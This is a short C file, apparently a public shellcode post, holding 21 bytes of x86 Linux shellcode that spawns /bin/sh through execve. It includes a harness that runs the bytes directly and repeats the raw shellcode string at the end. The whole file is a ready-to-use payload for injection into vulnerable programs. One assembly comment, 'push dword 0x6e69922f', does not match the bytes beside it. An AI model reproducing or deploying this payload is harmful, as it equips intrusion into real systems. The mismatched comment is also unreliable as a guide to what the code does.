/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/

int main(){

char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
"\x89\xe3" // mov ebx, esp
"\x31\xc9" // xor ecx, ecx
"\xcd\x80"; // int 0x80

((void (*)()) sc)();
}

/*
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
*/

--
ipv